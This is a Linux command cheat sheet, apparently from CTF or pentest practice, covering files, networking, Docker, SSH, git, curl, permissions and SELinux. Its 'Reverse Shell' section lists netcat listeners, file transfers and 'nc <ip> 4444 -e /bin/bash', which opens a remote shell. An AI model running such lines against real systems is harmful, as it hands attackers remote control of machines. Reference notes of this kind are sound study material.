## Search and Navigation
- `pwd` : Display the current working directory.
- `lsblk` : List mounted disks and partitions.
- `locate <file_name>` : Search for a file in the system.
- `which <command_name>` : Show the path of a command's executable.
- `history` : Display the history of executed commands.
- `find / -name "*...*" 2>/dev/null`: Search a file in the system 
- `tldr <tool>`: Display examples of use for different tools

## Networking & Services
- `telnet <host> 80` : Test connection to a service.
- `finger @<ip>` : List the users on a remote machine.
- `finger fabiano@<ip>` : Get specific information about a user.
- `wget -r -np -nH --cut-dirs=0 http://192.168.1.100:8000/` : Download all files/folders from a directory hosted on a Python web server.
- `ss -tulpn`: Display all the open port.

## System
- `kill {pid}`: Kill a process.
- `export VAR=value` : Create or modify an environment variable and make it available to child processes.

## Crypto & Certificates
- `openssl x509 -in key.pem -text -noout` : Analyze a X.509 certificate.
- `gpg --homedir /your/path/to/gpg_key -d file.gpg` : Decrypt a GPG-encrypted file (requires the corresponding private key or passphrase).  
- `gpg --encrypt -r <recipient> file.txt` : Encrypt a file for a specific recipient using their public key.

## Databases--homedir
- `sqlite3 filedb.sqlite` : Start an SQLite session on a `.sqlite` file.

## File
- `file <file_name>` : Display the file type.
- `ln -s /path/to/target /path/to/symlink`: Creat a symlink.

## Reverse Shell
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Upgrade a reverse shell to a fully interactive shell.
- `nc -lvnp 4444`: Open port 4444
- `nc <ip> 4444 > file.txt`: Connect to a port on another machine and save the received data into file.txt 
- `nc -lvnp 4444 < file.txt`: Listen on port 4444 and send the contents of file.txt to any connected client.
- `nc <ip> 4444 -e /bin/bash`: Connect to the reverse shell with nc

## Compression & Decompression
- `tar -cf archive.tar folder/` : Create a TAR archive without compression.  
- `tar -xf archive.tar` : Extract a TAR archive without compression.  
- `tar -czf archive.tar.gz folder/` : Create a TAR archive compressed with Gzip.  
- `tar -xzf archive.tar.gz` : Extract a TAR archive compressed with Gzip.  
- `tar -cjf archive.tar.bz2 folder/` : Create a TAR archive compressed with Bzip2.  
- `tar -xjf archive.tar.bz2` : Extract a TAR archive compressed with Bzip2.  
- `tar -cJf archive.tar.xz folder/` : Create a TAR archive compressed with XZ.  
- `tar -xJf archive.tar.xz` : Extract a TAR archive compressed with XZ.  
- `gzip file.txt` : Compress a single file with Gzip, replacing the original file.  
- `gunzip file.txt.gz` : Decompress a Gzip file.  
- `bzip2 file.txt` : Compress a single file with Bzip2, replacing the original file.  
- `bunzip2 file.txt.bz2` : Decompress a Bzip2 file.  
- `xz file.txt` : Compress a single file with XZ, replacing the original file.  
- `unxz file.txt.xz` : Decompress an XZ file.  
- `zip -r archive.zip folder/` : Create a ZIP archive containing a folder and its contents. 
- `unzip archive.zip` : Extract the contents of a ZIP archive.  

## Docker
- `docker ps` : List all running containers.
- `docker ps -a` : List all containers (running and stopped).
- `docker images` : List all available Docker images.
- `docker build -t <image_name> .` : Build an image from a Dockerfile in the current directory.
- `docker run -it --rm <image_name>` : Run a container interactively and remove it after exit.
- `docker run -d --name <container_name> <image_name>` : Run a container in detached mode with a specific name.
- `docker exec -it <container_name> /bin/bash` : Open an interactive shell inside a running container.
- `docker stop <container_name>` : Stop a running container.
- `docker start <container_name>` : Start a stopped container.
- `docker restart <container_name>` : Restart a container.
- `docker rm <container_name>` : Remove a stopped container.
- `docker rmi <image_name>` : Remove a Docker image.
- `docker logs <container_name>` : Show the logs of a container.
- `docker inspect <container_name>` : Show detailed information about a container.
- `docker cp <container_name>:/path/in/container /path/on/host` : Copy a file from a container to the host.
- `docker cp /path/on/host <container_name>:/path/in/container` : Copy a file from the host to a container.
- `docker-compose up -d` : Start all services defined in a `docker-compose.yml` in detached mode.
- `docker-compose down` : Stop and remove containers, networks, and volumes created by `docker-compose up`.
- `docker system prune -a` : Remove all stopped containers, unused images, and unused networks.

## SSH

- `chmod 600 id_rsa`: Restricts permissions so only the owner can read/write the private key (600: 110 000 000 = rw- --- ---).
- `ssh -i id_rsa root@<ip>`: Connect as root using the private key.
- `ssh-keygen -t rsa -b 4096 -C "alice@example.com"` : Generate a new SSH key pair (public/private).
- `ssh-copy-id alice@<server_ip>` : Copy the public key to the remote server for passwordless login.
- `mkdir -p /home/alice/.ssh && chmod 700 /home/alice/.ssh` : Create the `.ssh` directory with correct permissions.
- `echo "<public_key>" >> /home/alice/.ssh/authorized_keys` : Manually add a public key to `alice`’s authorized keys.
- `chmod 600 /home/alice/.ssh/authorized_keys` : Set correct permissions for the `authorized_keys` file.
- `ssh -i id_rsa alice@<server_ip>` : Connect to the server as `alice` using the private key.

## Github

- `git init` : initialize a repository in the current directory.  
- `git remote add origin <url>` : link the local folder to a remote repository.  
- `git branch -M main` : rename the main branch to `main` (optional).  
- `git push -u origin main` : first push and set the default upstream branch.  
- `git clone <url>` : clone a remote repository.  
- `git status` : show the state of working directory and staging area.  
- `git add <file|folder>` : add a file or folder to the staging area.  
- `git commit -m "message"` : create a commit with a message.  
- `git pull` : fetch and merge changes from the remote.  
- `git push` : push local commits to the remote repository.  
- `git log` : show commit history.  
- `git log -- <path>` : show commit history for a specific file or folder.  
- `git log --diff-filter=D --summary` : list deletions in history.  
- `git log --all --name-status | grep "Achievement"` : search for adds/modifies/deletes of a file across all history.  
- `git show --name-status <commit_id>` : show files changed in a commit (A/M/D/R).  
- `git show <commit_id>:<path>` : display the content of a file as it was in that commit.  
- `git checkout <commit_id>^ -- <path>` : restore the state just before that commit (useful for rename/deletion).  
- `git restore --source=<commit_id> -- <path>` : modern variant to restore a file/folder.  
- `git remote -v` : show configured remotes.  
- `git fetch origin`: Retrieve all information of remote repo 
- `git reset --hard origin/master`: Reset the local repository to match the remote repository


## Curl

- `curl <url>` : Perform a simple GET request.
- `curl -I <url>` : Fetch only the headers (HEAD request).
- `curl -v <url>` : Verbose mode (show request/response details).
- `curl -L <url>` : Follow redirects.
- `curl -k <url>` : Ignore SSL certificate errors (insecure).
- `curl -s <url>` : Silent mode (no progress bar/errors).
- `curl -o file.txt <url>` : Save output to a file.
- `curl -X POST <url>` : Force a POST request.
- `curl -d "param=value&param2=value2" <url>` : Send POST data (form-encoded).
- `curl -d @file.json -H "Content-Type: application/json" <url>` : Send JSON data from file.
- `curl -H "Header: value" <url>` : Add a custom header.
- `curl -A "User-Agent-Here" <url>` or `curl --user-agent "..." <url>` : Change the User-Agent.
- `curl -u user:pass <url>` : Send HTTP Basic Authentication.
- `curl --cookie "name=value" <url>` : Send cookies.
- `curl -c cookie.txt -b cookie.txt <url>` : Save and reuse cookies.
- `curl --proxy http://127.0.0.1:8080 <url>` : Route through a proxy (useful for BurpSuite).
- `curl --http2 <url>` : Force HTTP/2.
- `curl --interface <ip> <url>` : Use a specific network interface/IP.
- `curl -w "%{http_code}\n" -o /dev/null -s <url>` : Show only the HTTP status code.

## Echo & Output Tricks

- `echo "hello"` : Print text with a trailing newline (`\n`).
- `echo -n "hello"` : Print text **without** a trailing newline.
- `echo -e "line1\nline2"` : Enable interpretation of backslash escapes (`\n`, `\t`, etc.).
- `echo -n "dGVzdA==" | base64 -d` : Decode a Base64 string (`test`).
- `echo -n '{"username":"admin"}' | jq .` : Pretty-print JSON with `jq`.
- `echo -n "SGVsbG8=" | base64 -d | hexdump -C` : Decode Base64 and view in hex.
- `echo -n "<jwt>" | cut -d "." -f1 | base64 -d 2>/dev/null | jq .` : Decode JWT header.
- `echo -n "<jwt>" | cut -d "." -f2 | base64 -d 2>/dev/null | jq .` : Decode JWT payload.
- `echo "text" > file.txt` : Overwrite file with text.
- `echo "text" >> file.txt` : Append text to file.
- `echo -n "GET / HTTP/1.1\r\nHost: target\r\n\r\n" | nc target 80` : Manual HTTP request with netcat.
- `echo password | sudo -S command` : Provide password to sudo from stdin.
- `echo -n "68656c6c6f" | xxd -r -p` : Convert hex string to binary.

## Rights & Permissions

- `ls -l` : List files with their permissions.
- `chmod 644 file.txt` : Set file permissions using octal notation (`rw-r--r--`).
- `chmod u+x script.sh` : Add execute permission to the user (owner).
- `chmod g-w file.txt` : Remove write permission from the group.
- `chmod o-r file.txt` : Remove read permission from others.
- `chown user1 file.txt` : Change the owner of a file to `user1`.
- `chown user1:group1 file.txt` : Change the owner to `user1` and group to `group1`.
- `chgrp group1 file.txt` : Change only the group of a file.
- `umask 022` : Define the default permission mask for newly created files (here, files will be `644`).
- `getfacl file.txt` : Show ACL (Access Control List) entries for a file.
- `setfacl -m u:user1:rw file.txt` : Give `user1` read & write permissions on `file.txt` (without affecting others).
- `setfacl -m g:group1:r file.txt` : Give `group1` read-only access.
- `setfacl -x u:user1 file.txt` : Remove ACL entry for `user1`.
- `setfacl -R -m u:user1:rwx folder/` : Recursively give full access (rwx) to `user1` on a folder.
- `setfacl -m d:u:user1:rwx folder/` : Set default ACLs so all new files in the folder inherit these rights.

## User Management

- `adduser alice` : Create a new user `alice` (Debian/Ubuntu style).
- `useradd -m alice` : Create a new user `alice` with a home directory (RHEL/Fedora style).
- `passwd alice` : Set or change the password for `alice`.
- `usermod -aG sudo alice` : Add `alice` to the `sudo` group (Debian/Ubuntu).
- `usermod -aG wheel alice` : Add `alice` to the `wheel` group (RHEL/Fedora).
- `usermod -l newname alice` : Change the username from `alice` to `newname`.
- `usermod -d /new/home alice` : Change the home directory of `alice`.
- `deluser alice` : Delete the user `alice` (Debian/Ubuntu).
- `userdel -r alice` : Delete the user `alice` and remove their home directory (RHEL/Fedora).
- `groupadd devs` : Create a new group called `devs`.
- `usermod -aG devs alice` : Add `alice` to the `devs` group.
- `gpasswd -d alice devs` : Remove `alice` from the `devs` group.
- `getent passwd alice` : Display account information from `/etc/passwd`.
- `getent group devs` : Display information about the `devs` group.
## SELinux

- `getenforce` : Show current mode (`Enforcing`, `Permissive`, `Disabled`).
- `setenforce 1` : Enable **Enforcing** mode (block violations).
- `setenforce 0` : Switch to **Permissive** mode (log violations only).
- `sestatus` : Display SELinux status and policy details.
- `ls -Z file` : Show SELinux context of a file.
- `chcon -t container_file_t file` : Temporarily change context.
- `restorecon -Rv /path` : Restore default contexts recursively.